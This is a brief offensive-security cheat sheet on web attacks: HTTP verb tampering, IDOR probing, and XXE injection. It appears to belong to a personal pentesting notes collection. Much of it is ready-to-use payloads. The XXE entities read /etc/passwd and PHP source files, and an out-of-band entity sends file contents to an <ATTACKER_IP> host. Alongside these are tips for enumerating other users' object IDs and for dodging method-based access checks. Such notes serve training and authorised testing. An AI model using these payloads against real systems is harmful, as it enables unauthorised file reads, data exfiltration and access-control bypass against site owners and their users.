# Web Attacks

## HTTP Verb Tampering

Alternative methods worth testing when a route blocks `GET`/`POST`: `HEAD`, `PUT`, `DELETE`, `OPTIONS`, `PATCH`.

```bash
curl -X OPTIONS <URL>
```

If an endpoint enforces auth only on specific verbs (e.g. blocks `POST` but not `PUT`), verb tampering can bypass that check entirely.

## IDOR (Insecure Direct Object Reference)

**Where to look:**
- URL parameters and API request bodies (`?id=1042` → try `1041`, `1043`)
- AJAX calls (check the Network tab, not just the visible page)
- Reference values that are hashed/encoded rather than sequential — reverse-engineer the encoding
- Compare behavior across different user roles/privilege levels

**Useful for probing encoded references:**
```bash
md5sum <<< "1042"     # test if IDs are simple MD5 hashes
base64 <<< "1042"     # test if IDs are just base64
```

## XXE (XML External Entity)

```xml
<!ENTITY xxe SYSTEM "http://localhost/email.dtd">           <!-- remote entity -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">                    <!-- local file read -->
<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">  <!-- read PHP source without executing it -->
```

**Error-based exfiltration** (when direct output isn't reflected):
```xml
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

**Out-of-band exfiltration** (when nothing is reflected at all):
```xml
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://<ATTACKER_IP>:8000/?content=%file;'>">
```

---

<div align="center">

*Part of the [D4RKGUNN3R Cheatsheets](./README.md) collection.*

</div>
